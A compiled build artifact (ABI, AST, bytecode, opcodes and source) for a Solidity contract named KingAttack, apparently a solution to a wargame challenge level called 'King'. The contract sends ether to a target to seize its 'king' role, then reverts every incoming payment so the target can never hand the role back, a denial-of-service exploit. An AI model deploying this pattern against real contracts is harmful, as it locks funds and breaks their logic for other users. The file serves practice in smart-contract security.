@@ -1,0 +1,584 @@
+{
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address payable",
+          "name": "_addr",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "payable",
+      "type": "constructor"
+    },
+    {
+      "stateMutability": "payable",
+      "type": "fallback"
+    }
+  ],
+  "allSourcePaths": {
+    "0": "contracts/09_King/KingAttack.sol"
+  },
+  "ast": {
+    "absolutePath": "contracts/09_King/KingAttack.sol",
+    "exportedSymbols": {
+      "KingAttack": [
+        25
+      ]
+    },
+    "id": 26,
+    "nodeType": "SourceUnit",
+    "nodes": [
+      {
+        "id": 1,
+        "literals": [
+          "solidity",
+          "0.6",
+          ".4"
+        ],
+        "nodeType": "PragmaDirective",
+        "src": "0:22:0"
+      },
+      {
+        "abstract": false,
+        "baseContracts": [],
+        "contractDependencies": [],
+        "contractKind": "contract",
+        "documentation": null,
+        "fullyImplemented": true,
+        "id": 25,
+        "linearizedBaseContracts": [
+          25
+        ],
+        "name": "KingAttack",
+        "nodeType": "ContractDefinition",
+        "nodes": [
+          {
+            "body": {
+              "id": 15,
+              "nodeType": "Block",
+              "src": "101:49:0",
+              "statements": [
+                {
+                  "expression": {
+                    "argumentTypes": null,
+                    "arguments": [
+                      {
+                        "argumentTypes": null,
+                        "hexValue": "",
+                        "id": 12,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": true,
+                        "kind": "string",
+                        "lValueRequested": false,
+                        "nodeType": "Literal",
+                        "src": "140:2:0",
+                        "subdenomination": null,
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
+                          "typeString": "literal_string \"\""
+                        },
+                        "value": ""
+                      }
+                    ],
+                    "expression": {
+                      "argumentTypes": [
+                        {
+                          "typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
+                          "typeString": "literal_string \"\""
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": null,
+                        "expression": {
+                          "argumentTypes": null,
+                          "id": 6,
+                          "name": "_addr",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": 3,
+                          "src": "111:5:0",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_address_payable",
+                            "typeString": "address payable"
+                          }
+                        },
+                        "id": 8,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "lValueRequested": false,
+                        "memberName": "call",
+                        "nodeType": "MemberAccess",
+                        "referencedDeclaration": null,
+                        "src": "111:10:0",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
+                          "typeString": "function (bytes memory) payable returns (bool,bytes memory)"
+                        }
+                      },
+                      "id": 11,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "names": [
+                        "value"
+                      ],
+                      "nodeType": "FunctionCallOptions",
+                      "options": [
+                        {
+                          "argumentTypes": null,
+                          "expression": {
+                            "argumentTypes": null,
+                            "id": 9,
+                            "name": "msg",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": -15,
+                            "src": "129:3:0",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_magic_message",
+                              "typeString": "msg"
+                            }
+                          },
+                          "id": 10,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "memberName": "value",
+                          "nodeType": "MemberAccess",
+                          "referencedDeclaration": null,
+                          "src": "129:9:0",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_uint256",
+                            "typeString": "uint256"
+                          }
+                        }
+                      ],
+                      "src": "111:28:0",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value",
+                        "typeString": "function (bytes memory) payable returns (bool,bytes memory)"
+                      }
+                    },
+                    "id": 13,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "111:32:0",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
+                      "typeString": "tuple(bool,bytes memory)"
+                    }
+                  },
+                  "id": 14,
+                  "nodeType": "ExpressionStatement",
+                  "src": "111:32:0"
+                }
+              ]
+            },
+            "documentation": null,
+            "id": 16,
+            "implemented": true,
+            "kind": "constructor",
+            "modifiers": [],
+            "name": "",
+            "nodeType": "FunctionDefinition",
+            "overrides": null,
+            "parameters": {
+              "id": 4,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 3,
+                  "name": "_addr",
+                  "nodeType": "VariableDeclaration",
+                  "overrides": null,
+                  "scope": 16,
+                  "src": "63:21:0",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address_payable",
+                    "typeString": "address payable"
+                  },
+                  "typeName": {
+                    "id": 2,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "63:15:0",
+                    "stateMutability": "payable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address_payable",
+                      "typeString": "address payable"
+                    }
+                  },
+                  "value": null,
+                  "visibility": "internal"
+                }
+              ],
+              "src": "62:23:0"
+            },
+            "returnParameters": {
+              "id": 5,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "101:0:0"
+            },
+            "scope": 25,
+            "src": "50:100:0",
+            "stateMutability": "payable",
+            "virtual": false,
+            "visibility": "public"
+          },
+          {
+            "body": {
+              "id": 23,
+              "nodeType": "Block",
+              "src": "183:30:0",
+              "statements": [
+                {
+                  "expression": {
+                    "argumentTypes": null,
+                    "arguments": [
+                      {
+                        "argumentTypes": null,
+                        "hexValue": "626c61",
+                        "id": 20,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": true,
+                        "kind": "string",
+                        "lValueRequested": false,
+                        "nodeType": "Literal",
+                        "src": "200:5:0",
+                        "subdenomination": null,
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_stringliteral_ba32c71348cf21e808067890691aa790486e3a99e628b68cd2bfeb51381bfec1",
+                          "typeString": "literal_string \"bla\""
+                        },
+                        "value": "bla"
+                      }
+                    ],
+                    "expression": {
+                      "argumentTypes": [
+                        {
+                          "typeIdentifier": "t_stringliteral_ba32c71348cf21e808067890691aa790486e3a99e628b68cd2bfeb51381bfec1",
+                          "typeString": "literal_string \"bla\""
+                        }
+                      ],
+                      "id": 19,
+                      "name": "revert",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [
+                        -19,
+                        -19
+                      ],
+                      "referencedDeclaration": -19,
+                      "src": "193:6:0",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_revert_pure$_t_string_memory_ptr_$returns$__$",
+                        "typeString": "function (string memory) pure"
+                      }
+                    },
+                    "id": 21,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "193:13:0",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 22,
+                  "nodeType": "ExpressionStatement",
+                  "src": "193:13:0"
+                }
+              ]
+            },
+            "documentation": null,
+            "id": 24,
+            "implemented": true,
+            "kind": "fallback",
+            "modifiers": [],
+            "name": "",
+            "nodeType": "FunctionDefinition",
+            "overrides": null,
+            "parameters": {
+              "id": 17,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "163:2:0"
+            },
+            "returnParameters": {
+              "id": 18,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "183:0:0"
+            },
+            "scope": 25,
+            "src": "155:58:0",
+            "stateMutability": "payable",
+            "virtual": false,
+            "visibility": "external"
+          }
+        ],
+        "scope": 26,
+        "src": "24:191:0"
+      }
+    ],
+    "src": "0:215:0"
+  },
+  "bytecode": "608060405260405160e038038060e083398181016040526020811015602357600080fd5b50516040516001600160a01b038216903490600081818185875af1925050503d8060008114606c576040519150601f19603f3d011682016040523d82523d6000602084013e6071565b606091505b50505050605e8060826000396000f3fe6080604081905262461bcd60e51b81526020608452600360a45262626c6160e81b60c452606490fdfea2646970667358221220be24636b51e93a59e616dc7d6959cd36b0183cd865e869ce100f511dd77bc18964736f6c63430006040033",
+  "bytecodeSha1": "b2568e03ef4031f895e1ff2352b91ec277df413f",
+  "compiler": {
+    "evm_version": "istanbul",
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "version": "0.6.4+commit.1dca32f3"
+  },
+  "contractName": "KingAttack",
+  "coverageMap": {
+    "branches": {
+      "0": {}
+    },
+    "statements": {
+      "0": {
+        "KingAttack.<fallback>": {
+          "0": [
+            193,
+            206
+          ]
+        }
+      }
+    }
+  },
+  "dependencies": [],
+  "deployedBytecode": "6080604081905262461bcd60e51b81526020608452600360a45262626c6160e81b60c452606490fdfea2646970667358221220be24636b51e93a59e616dc7d6959cd36b0183cd865e869ce100f511dd77bc18964736f6c63430006040033",
+  "deployedSourceMap": "24:191:0:-:0;;;;;-1:-1:-1;;;193:13:0;;;;;;;;-1:-1:-1;;;193:13:0;;;;",
+  "language": "Solidity",
+  "natspec": {
+    "methods": {}
+  },
+  "offset": [
+    24,
+    215
+  ],
+  "opcodes": "PUSH1 0x80 PUSH1 0x40 DUP2 SWAP1 MSTORE PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x84 MSTORE PUSH1 0x3 PUSH1 0xA4 MSTORE PUSH3 0x626C61 PUSH1 0xE8 SHL PUSH1 0xC4 MSTORE PUSH1 0x64 SWAP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xBE 0x24 PUSH4 0x6B51E93A MSIZE 0xE6 AND 0xDC PUSH30 0x6959CD36B0183CD865E869CE100F511DD77BC18964736F6C634300060400 CALLER ",
+  "pcMap": {
+    "0": {
+      "offset": [
+        24,
+        215
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x80"
+    },
+    "2": {
+      "fn": null,
+      "offset": [
+        24,
+        215
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x40"
+    },
+    "4": {
+      "fn": null,
+      "offset": [
+        24,
+        215
+      ],
+      "op": "DUP2",
+      "path": "0"
+    },
+    "5": {
+      "fn": null,
+      "offset": [
+        24,
+        215
+      ],
+      "op": "SWAP1",
+      "path": "0"
+    },
+    "6": {
+      "fn": null,
+      "offset": [
+        24,
+        215
+      ],
+      "op": "MSTORE",
+      "path": "0"
+    },
+    "7": {
+      "op": "PUSH3",
+      "value": "0x461BCD"
+    },
+    "11": {
+      "op": "PUSH1",
+      "value": "0xE5"
+    },
+    "13": {
+      "op": "SHL"
+    },
+    "14": {
+      "fn": "KingAttack.<fallback>",
+      "offset": [
+        193,
+        206
+      ],
+      "op": "DUP2",
+      "path": "0",
+      "statement": 0
+    },
+    "15": {
+      "fn": "KingAttack.<fallback>",
+      "offset": [
+        193,
+        206
+      ],
+      "op": "MSTORE",
+      "path": "0"
+    },
+    "16": {
+      "fn": "KingAttack.<fallback>",
+      "offset": [
+        193,
+        206
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x20"
+    },
+    "18": {
+      "fn": "KingAttack.<fallback>",
+      "offset": [
+        193,
+        206
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x84"
+    },
+    "20": {
+      "fn": "KingAttack.<fallback>",
+      "offset": [
+        193,
+        206
+      ],
+      "op": "MSTORE",
+      "path": "0"
+    },
+    "21": {
+      "fn": "KingAttack.<fallback>",
+      "offset": [
+        193,
+        206
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x3"
+    },
+    "23": {
+      "fn": "KingAttack.<fallback>",
+      "offset": [
+        193,
+        206
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0xA4"
+    },
+    "25": {
+      "fn": "KingAttack.<fallback>",
+      "offset": [
+        193,
+        206
+      ],
+      "op": "MSTORE",
+      "path": "0"
+    },
+    "26": {
+      "op": "PUSH3",
+      "value": "0x626C61"
+    },
+    "30": {
+      "op": "PUSH1",
+      "value": "0xE8"
+    },
+    "32": {
+      "op": "SHL"
+    },
+    "33": {
+      "fn": "KingAttack.<fallback>",
+      "offset": [
+        193,
+        206
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0xC4"
+    },
+    "35": {
+      "fn": "KingAttack.<fallback>",
+      "offset": [
+        193,
+        206
+      ],
+      "op": "MSTORE",
+      "path": "0"
+    },
+    "36": {
+      "fn": "KingAttack.<fallback>",
+      "offset": [
+        193,
+        206
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x64"
+    },
+    "38": {
+      "fn": "KingAttack.<fallback>",
+      "offset": [
+        193,
+        206
+      ],
+      "op": "SWAP1",
+      "path": "0"
+    },
+    "39": {
+      "fn": "KingAttack.<fallback>",
+      "offset": [
+        193,
+        206
+      ],
+      "op": "REVERT",
+      "path": "0"
+    }
+  },
+  "sha1": "7959556d9f81521a41b5f0300a60f5236183cb0f",
+  "source": "pragma solidity 0.6.4;\n\ncontract KingAttack {\n    constructor (address payable _addr) public payable {\n        _addr.call{value: msg.value}(\"\");\n    }\n    fallback() external payable {\n        revert(\"bla\");\n    }\n}",
+  "sourceMap": "24:191:0:-:0;;;50:100;;;;;;;;;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;-1:-1;50:100:0;111:32;;-1:-1:-1;;;;;111:10:0;;;129:9;;111:32;;;;129:9;111:10;:32;;;;;;;12:1:-1;19;14:27;;;;67:4;61:11;56:16;;134:4;130:9;123:4;105:16;101:27;97:43;94:1;90:51;84:4;77:65;157:16;154:1;147:27;211:16;208:1;201:4;198:1;194:12;179:49;5:228;;14:27;32:4;27:9;;5:228;;111:32:0;;50:100;24:191;;;;;;",
+  "sourcePath": "contracts/09_King/KingAttack.sol",
+  "type": "contract"
+}
